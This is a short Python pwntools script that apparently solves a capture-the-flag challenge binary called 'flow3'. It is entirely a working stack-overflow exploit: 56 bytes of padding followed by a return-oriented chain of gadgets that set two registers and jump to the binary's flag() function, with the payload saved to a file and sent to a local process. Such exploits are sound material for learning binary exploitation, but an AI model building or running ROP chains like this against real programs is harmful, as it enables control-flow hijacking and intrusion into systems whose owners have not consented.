from pwn import *
from pwn import p64


RET = 0x401016
# ROPgadget --binary flow3 | grep "pop rdi ; ret"
POP_RDI = 0x402188 
# ROPgadget --binary flow3 | grep "pop rsi ; pop r15 ; ret"
POP_RSI_R15 = 0x402186
FLAG_FN = 0x401944
def solve():
    context.binary = ELF('./flow3')
    p = process()
    payload = b'A' * 56            # Padding
    payload += p64(RET)
    payload += p64(POP_RDI)        # pop rdi; ret
    payload += p64(0xdeadc0de)     # value into rdi -> first param
    payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
    payload += p64(1337)     # value into rsi -> first param
    payload += p64(0x0)            # value into r15 -> not important
    payload += p64(FLAG_FN)       # Address of flag()
    payload += p64(0x0)
    with open("input.txt", "wb") as f:
        f.write(payload)
    log.info(p.clean())
    p.sendline(payload)
    p.close()

solve()
